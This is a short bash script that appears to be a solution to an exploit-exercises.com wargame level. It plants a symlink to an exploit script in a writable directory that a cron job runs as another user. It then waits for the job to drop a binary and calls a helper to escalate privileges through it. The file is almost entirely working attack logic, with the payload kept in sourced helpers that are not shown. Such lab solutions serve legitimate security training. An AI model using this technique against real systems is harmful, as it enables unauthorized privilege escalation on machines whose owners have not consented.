#!/bin/bash -eu
# Copyright (c) 2015, Heye Voecking <heye.voecking+exploit-exercises.com@gmail.com>

source $HOME/common/setup-exploit

ln -s $EXPLOIT_SCRIPT $TARGET_HOME/writable.d/script.sh
# The symlink will be removed by the cronjob, so force remove in case this
# script fails
registerTrap "rm -f $TARGET_HOME/writable.d/script.sh" EXIT

echo -n "Waiting for cronjob to run, this may take a few minutes"
while [[ ! -s $EXPLOIT_BIN ]]
do
  # Sadly we don't have inotifywait
  # inotifywait -qqt 2 -e create -e moved_to "$(dirname $TMP)"
  # So we use this
  echo -n "."
  sleep 2
done
echo " done"

exploit_with_binary
